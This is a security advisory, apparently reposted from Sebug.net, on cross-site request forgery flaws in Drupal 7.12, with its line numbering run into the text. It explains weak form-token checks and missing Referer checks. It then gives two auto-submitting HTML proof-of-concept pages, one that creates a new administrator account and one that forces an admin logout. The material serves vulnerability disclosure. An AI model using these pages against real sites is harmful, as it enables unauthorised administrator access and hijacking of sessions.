Drupal CMS version 7.12 suffers from multiple cross site request forgery vulnerabilities

发布时间: 2012-03-02 (GMT+0800)

测试方法:

@Sebug.net   dis
本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.# Exploit Title    : Drupal CMS 7.12 (latest stable release) Multiple Vulnerabilities 2.# Date             : 02-03-20123.# Author           : Ivano Binetti (http://ivanobinetti.com)4.# Software link    : http://drupal.org/download5.# Vendor site      : http://drupal.org6.# Version          : 7.12 (and lower)7.# Tested on        : Debian Squeeze (6.0) 8.# Original Advisory: http://ivanobinetti.blogspot.com/2012/03/drupal-cms-712-latest-stable-release.html9.+---------------------------------------------------------------------------------------------------------------------------------------------------+10.+-------------------------[Multiple Vulnerabilities by Ivano Binetti]-------------------------------------------------------------------------------+11.Summary12. 13.1)Introduction14.2)Vulnerabilities Description 15. 2.1 Poor Session Checking (CSRF to change any Drupal settings)16. 2.2 Poor Session Checking (CSRF to Force administrator logout)17. 2.3 Poor Session Checking (POST and GET method)18. 2.4 Poor Session Checking (Http Referer)19.3)Exploit20. 3.1 Exploit (Add Administrator)21. 3.2 Exploit (Force logout)22. 23.+---------------------------------------------------------------------------------------------------------------------------------------------------+24. 25.1)Introduction26.Drupal "is an open source content management platform powering millions of websites and applications. It’s built, used, and supported by an active27.and diverse community of people around the world".28. 29.2)Vulnerability Description 30.Drupal 7.12 -latest stable release - suffers from multiple vulnerabilities which could allow an attacker to gain access to the management interface.31. 32. 2.1 Poor Session Checking (CSRF to change any Drupal settings)33. Drupal, to secure changes made by administrators or users through web management interface, uses two alphanumeric parameters 34. ("form_buid_id" and "form_token") which are sent inside any http POST request. 35. The parameter "form_buid_id" is generated different for any operation an admin/user performs, but there is a security flaw  which allows to36. use any other Drupal generated "form_buid_id" parameter (like this: "form-0iFqLlofT1uuJ_uwXPNdVlc_J9KL20oZE15dK9hxuQ8") to make changes to Drupal settings37. through web management  interface. So, even if Drupal  creates a different "form_buid_id" for any operation you can use another "form_buid_id"38. compatible with Drupal instead of that generated by Drupa for that specific operation.39. In the other parameter, "form_token", there is another security flaw inside the logic with which this parameter is generated, because is used the 40. same parameter for for similar operations  in the same session (for example for article's creation Drupal assigns the same "form_token", for admin/user41. creation Drupal assigns the same "form_token" and so on). This flaw can be used by un attacker which  knows the values of "form_buid_id" and "form_token"42. parameters (for example an internal attacker performing a "Man in The Middle Attack" or an external ttacker that controls an internal client by an43. client-side exploit, an external attacker that controls directly a Drupal admin by a client-side exploit and son on. There are many possibilities)44. to create an "ad-hoc" crafted web page that allows to performs any Drupal changes (add administrator, delete administrator, add web pages, delete 45. web pages, and so on) when a Drupal administrator or User browses that crafted web page.46. 47. 2.2 Poor Session Checking (CSRF to Force administrator logout)48. There is another vulnerability - always related to poor session checking / improper input validation - in "<drupal_ip>/user/logout" which allows49. an attacker to create a crafted web page an force logout of Drupal administrator/users at web management interface. This vulnerability - forcing 50. administrator logout - will aid an attacker to sniff authentication credentials when a "Man in The Middle Attack" is performed.51. 52. 2.3 Poor Session Checking (POST and GET method)53. Drupal does not check "GET" or "POST" http method allowing, even though normal logout is made via http GET request, to exploit the above vulnerability  54. using http POST method. 55. 56. 2.4 Poor Session Checking (Http Referer)57. Drupal, furthermore, does not perform "http referer" checking, allowing to exploit all above described vulnerabilities.58. 59.3)Exploit 60. 61. 3.1 Exploit (Add Administrator)62. <html>63. <body onload="javascript:document.forms[0].submit()">64. <H2>CSRF Exploit change user to admin</H2>65. <form method="POST" name="form0" action="http://<drupal_ip>:80/drupal/admin/people/create?render=overlay&render=overlay">66. <input type="hidden" name="name" value="new_admin"/>67. <input type="hidden" name="mail" value="new_admin@new_admin.com"/>68. <input type="hidden" name="pass[pass1]" value="new_password"/>69. <input type="hidden" name="pass[pass2]" value="new_password"/>70. <input type="hidden" name="status" value="1"/>71. <input type="hidden" name="timezone" value="Europe/Prague"/>72. <input type="hidden" name="form_build_id" value="form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY"/>73. <input type="hidden" name="form_token" value="cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc"/>74. <input type="hidden" name="form_id" value="user_register_form"/>75. <input type="hidden" name="op" value="Create new account"/>76. </form>77. </body>78. </html>79. 80. 81. 3.2 Exploit (Force logout)82. <html>83. <body onload="javascript:document.forms[0].submit()">84. <H2>CSRF Exploit to logout Admin</H2>85. <form method="POST" name="form0" action="http://<drupal_ip>:80/drupal/user/logout">86. </form>87. </body>88. </html>